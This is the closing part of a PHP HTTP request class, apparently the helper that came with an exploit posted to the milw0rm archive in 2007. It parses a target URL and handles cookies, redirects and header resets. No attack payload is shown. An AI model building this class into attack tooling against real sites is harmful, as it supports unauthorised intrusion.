		$array = explode(&quot;/&quot;,str_replace(&quot;http://&quot;,&quot;&quot;,preg_replace(&quot;/:(\d+)/&quot;,&quot;&quot;,$urltarg)));
		$this-&gt;host=$array[0];

		preg_match(&quot;/:(\d+)\//&quot;,$urltarg,$matches);
		$this-&gt;port=empty($matches[1]) ? 80 : $matches[1];
		
		$temp = str_replace(&quot;http://&quot;,&quot;&quot;,preg_replace(&quot;/:(\d+)/&quot;,&quot;&quot;,$urltarg));
		preg_match(&quot;/\/(.*)\//&quot;,$temp,$matches);
		$this-&gt;path=str_replace(&quot;//&quot;,&quot;/&quot;,&quot;/&quot;.$matches[1].&quot;/&quot;);
	
		if($this-&gt;port &gt; 65535) die(&quot;Error: Invalid port number&quot;);
	}
	
	
	/**
	 * If you call this function, the script will
	 * extract all &quot;Set-Cookie&quot; headers values
	 * and it will automatically add them into the &quot;Cookie&quot; header
	 * for all next requests.
	 *
	 * $this-&gt;cookiejar(1); // enabled
	 * $this-&gt;cookiejar(0); // disabled
	 * 
	 */
	public function cookiejar($code)
	{
		if($code===0) $this-&gt;cookiejar='';
		if($code===1) $this-&gt;cookiejar=1;
		else
		{
			$this-&gt;getcookie($code);
		}
	}


	/**
	 * If you call this function, the script will
	 * follow all redirections sent by the server.
	 * 
	 * $this-&gt;allowredirection(1); // enabled
	 * $this-&gt;allowredirection(0); // disabled
	 * 
	 * @return $this-&gt;get($locationresponse)
	 */
	public function allowredirection($code)
	{
		if($code===0) $this-&gt;allowredirection='';
		if($code===1) $this-&gt;allowredirection=1;
		else
		{
			if(preg_match(&quot;/(location|content-location|uri): (.*)/i&quot;,$code,$codearr))
			{
				$location = str_replace(chr(13),'',$codearr[2]);
				if(!eregi(&quot;://&quot;,$location))
				{
					return $this-&gt;get(&quot;http://&quot;.$this-&gt;host.$this-&gt;path.$location);
				}
				else
				{
					return $this-&gt;get($location);
				}
			}
			else
			{
				return $code;
			}
		}
	}
	
	
	/**
	 * This function allows you to reset some parameters:
	 * 
	 * $this-&gt;reset(header); // headers cleaned
	 * $this-&gt;reset(cookie); // cookies cleaned
	 * $this-&gt;reset();       // clean all parameters
	 *
	 * @param string $func
	 */
	public function reset($func='')
	{
		switch($func)
		{
			case &quot;header&quot;:
			$this-&gt;header='';
			break;
			
			case &quot;cookie&quot;:
			$this-&gt;cookie='';
			break;
			
			default:
		        $this-&gt;cookiejar='';
		        $this-&gt;header='';
		        $this-&gt;cookie='';
		        $this-&gt;allowredirection=''; 
		        $this-&gt;agent='';
		        break;
		}
	}
}
?&gt;

# milw0rm.com [2007-04-03]</pre></html>